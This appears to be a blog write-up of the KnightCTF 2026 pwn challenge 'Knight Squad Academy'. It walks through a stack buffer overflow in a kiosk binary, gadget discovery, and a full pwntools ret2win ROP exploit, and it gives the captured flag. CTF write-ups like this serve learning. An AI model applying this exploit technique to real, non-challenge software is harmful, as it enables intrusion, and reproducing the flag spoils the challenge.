---
layout: post
title:  "Knight Squad Academy"
date:   2026-01-21 15:36:10 -0400
author: robo.uzi
tags: [CTF]
permalink: /knightctf-2026-knight-squad-academy/
---

**Title**: Knight Squad Academy

**Author**: NomanProdhan

**Category**: Pwn

**Description**: Its our academy... :D Connection Info: `nc 66.228.49.41 5000`

I get the binary:
```shell
file ksa_kiosk  
ksa_kiosk: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=8102e9931dc90046182737ff6b4feb54e24527fe, for GNU/Linux 4.4.0, stripped
```

Running `checksec`:
- No PIE: The binary is loaded at a fixed base address (0x400000) so all function and gadget addresses are static and reliable for ROP.
- NX enabled: Stack is non executable so shellcode injection is not possible.
- No stack canary: Stack buffer overflows are not detected allowing us to overwrite the return address.

When connecting to the server I see this:
```shell
nc 66.228.49.41 5000  
====================================================  
            Knight Squad Academy  
          Enrollment Kiosk  (v2.1)  
====================================================  
Authorized personnel only. All actions are audited.  
  
1) Register cadet  
2) Enrollment status  
3) Exit  
> 1  
  
--- Cadet Registration ---  
Cadet name:  
> test cadet    
Enrollment notes:  
> test notes  
[Enrollment] Entry received.  
Welcome, Cadet test cadet.  
Please wait for assignment.  
4) Register cadet  
5) Enrollment status  
6) Exit  
> 2  
[Registry] Enrollment status: PENDING REVIEW  
[Registry] Background check: IN PROGRESS  
7) Register cadet  
8) Enrollment status  
9) Exit  
> 3  
Goodbye.  
^C
```
Looks like I can "register a cadet" with a name and a note, and check my enrollment status. 

A buffer overflow occurs in the cadet registration handler, which contains two local buffers:
- `local_78[64]`: enrollment notes (overflow source)
- `local_38[40]`: cadet name
- `local_10`: size variable (8 bytes)

On x86‑64, the stack also contains:
- saved RBP (8 bytes)
- saved RIP (8 bytes)

To overwrite the return address we must write 120 bytes. 

In ghidra I also see this function:
```d
void FUN_004013ac(long param_1)

{
  undefined8 local_98;
  undefined8 local_90;
  undefined8 local_88;
  undefined8 local_80;
  undefined8 local_78;
  undefined8 local_70;
  undefined8 local_68;
  undefined8 local_60;
  undefined8 local_58;
  undefined8 local_50;
  undefined8 local_48;
  undefined8 local_40;
  undefined8 local_38;
  undefined8 local_30;
  undefined8 local_28;
  undefined8 local_20;
  FILE *local_10;
  
  if (param_1 != 0x1337c0decafebeef) {
    puts("[SECURITY] Authorization failed.");
    fflush(stdout);
    FUN_004011c6("Session terminated.");
  }
  local_10 = fopen("./flag.txt","r");
  if (local_10 == (FILE *)0x0) {
    FUN_004011c6("Server error.");
  }
  local_98 = 0;
  local_90 = 0;
  local_88 = 0;
  local_80 = 0;
  local_78 = 0;
  local_70 = 0;
  local_68 = 0;
  local_60 = 0;
  local_58 = 0;
  local_50 = 0;
  local_48 = 0;
  local_40 = 0;
  local_38 = 0;
  local_30 = 0;
  local_28 = 0;
  local_20 = 0;
  fgets((char *)&local_98,0x80,local_10);
  fclose(local_10);
  puts("[Registry] Clearance badge issued:");
  puts((char *)&local_98);
  fflush(stdout);
  return;
}
```
The first argument is passed via the RDI register.  To successfully call this function, execution must be redirected to it with RDI set to `0x1337c0decafebeef`.

I find the address for the `pop rdi ; ret` instruction as well as just a `ret` instruction:
```shell
ROPgadget --binary ksa_kiosk --only "pop|ret" | grep rdi  
0x000000000040150b : pop rdi ; ret

ROPgadget --binary ksa_kiosk --only "ret"  
Gadgets information  
============================================================  
0x000000000040101a : ret  
0x0000000000401272 : ret 0xb60f  
  
Unique gadgets found: 2
```

Exploit script:
```python
from pwn import *

context.binary = './ksa_kiosk'
p = remote('66.228.49.41', 5000)

offset   = 120
ret      = 0x40101a
pop_rdi  = 0x40150b
ret2win  = 0x4013ac
magic    = 0x1337c0decafebeef

p.recvuntil(b'> ')
p.sendline(b'1')

p.recvuntil(b'> ')
p.sendline(b'AAAA')

p.recvuntil(b'> ')
payload  = b'A' * offset
payload += p64(ret)
payload += p64(pop_rdi)
payload += p64(magic)
payload += p64(ret2win)

p.send(payload)
p.interactive()
```

Output:
```shell
python3 solve3.py  
[*] '/home/user/Desktop/ctf/knightctf2026/ksa_kiosk'  
   Arch:       amd64-64-little  
   RELRO:      Full RELRO  
   Stack:      No canary found  
   NX:         NX enabled  
   PIE:        No PIE (0x400000)  
[+] Opening connection to 66.228.49.41 on port 5000: Done  
[*] Switching to interactive mode  
[Enrollment] Entry received.  
Welcome, Cadet AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x98.  
Please wait for assignment.  
[Registry] Clearance badge issued:  
Your Flag : KCTF{_We3Lc0ME_TO_Knight_Squad_Academy_} ... Visit our website : knightsquad.academy  
[*] Got EOF while reading in interactive  
$    
[*] Interrupted  
[*] Closed connection to 66.228.49.41 port 5000
```

`KCTF{_We3Lc0ME_TO_Knight_Squad_Academy_}`
